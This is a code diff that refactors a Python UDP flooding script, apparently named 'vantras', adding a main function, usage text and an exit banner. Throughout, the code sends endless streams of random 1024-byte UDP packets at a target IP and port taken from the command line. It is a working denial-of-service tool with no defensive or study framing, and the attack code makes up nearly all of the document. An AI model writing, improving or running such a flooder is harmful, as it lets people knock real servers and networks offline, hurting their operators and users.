@@ -2,24 +2,34 @@ import socket
 import random
 import sys
 
-def sent(dest_ip,dest_port):
+#usage vantras <ip> <port> --threads <threads>
+#           argv[1] argv[2]  argv[3]  argv[4]
 
-    i = 0
-    port = int(dest_port)
-    ip = dest_ip
 
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    packet = random._urandom(1024)
+def sent(atck_ip,atck_port,i):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        packet = random._urandom(1024)
 
-    while True:
-        try:
+        port = int(atck_port)
+        ip = atck_ip
+        
+        while True:
+            try:
 
-            i += 1
-            sock.sendto(packet, (ip, port))
+                i += 1
+                sock.sendto(packet, (ip, port))
 
-        except KeyboardInterrupt:
+            except KeyboardInterrupt:
+                end(i)
 
-            print(f"""
+    except IndexError:
+        print('''something is wrong!
+usage: vantras <ip> <port> --threads <threads>''')
+        exit()
+
+def end(i):
+    print(f"""
                                     ░██
                                     ░██
 ░██    ░██  ░██████   ░████████  ░████████ ░██░████  ░██████    ░███████
@@ -31,26 +41,24 @@ _______________________________________________________________________________
 packages sent: {i}
 See you space cowboy!
 """)
-            exit()
+    exit()
 
 
+def main():
+    i = 0
+
+    try: 
+        if len(sys.argv[1]) >3 and len(sys.argv[2]) >= 2:
+          sent(sys.argv[1],sys.argv[2],i)
+
+    except IndexError:
+
+     print('''using default port:
+[*] 80
+''')
+    sent(sys.argv[1],80,i)
 
 
-
-
-
-
-
-try:
-    if len(sys.argv[1]) > 3 and len(sys.argv[2]) >= 2:
-
-        sent(sys.argv[1],sys.argv[2])
-    else:
-
-        print("_______________________________________________________________________________")
-        print("usage: python3 udpFlooder <ip> <port>")
-
-except IndexError:
-
-    print('using default port 80')
-    sent(sys.argv[1],80)
+if __name__ == '__main__':
+    
+    main()
